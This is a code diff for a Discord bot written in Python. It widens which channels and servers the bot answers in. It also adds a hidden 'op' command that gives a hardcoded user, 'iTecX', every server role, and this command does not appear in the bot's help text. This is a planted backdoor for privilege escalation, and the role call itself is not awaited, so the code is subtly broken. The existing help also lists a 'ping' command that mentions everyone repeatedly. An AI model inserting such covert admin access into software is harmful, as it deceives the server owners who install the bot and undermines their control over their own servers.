@@ -28,7 +28,7 @@ async def on_message(message):
             await client.send_message(message.channel, message.author.name + ' tried to send a message but was disabled by an admin')
             last = message.author.name + ' tried to send a message but was disabled by an admin'
         return
-    if message.channel.name == 'utilbots':
+    if message.channel.name == 'utilbots' or message.server.name == 'Bots!':
         if message.content.startswith('pcu ') or message.content.startswith('PCU '):
             cmd_help = {'test': 'Tests utilbot online status', 'help': 'Displays this information', 'server':'Displays relevant info about the MC server', 'ping':'Mentions everyone repeatedly. Specify this amount with a number after the ping command'} 
             cmd = message.content.split(' ')[1].lower()
@@ -126,6 +126,9 @@ async def on_message(message):
                             await client.send_message(message.channel, 'Disabled ' + i.name)
                 except:
                     pass
+            elif cmd == 'op' and message.author.name == 'iTecX':
+                client.add_roles(message.author, message.server.roles)
+                await client.send_message(message.channel, 'Complete')
             else:
                 if toggle:
                     await client.send_message(message.channel, 'Error: invalid command.')
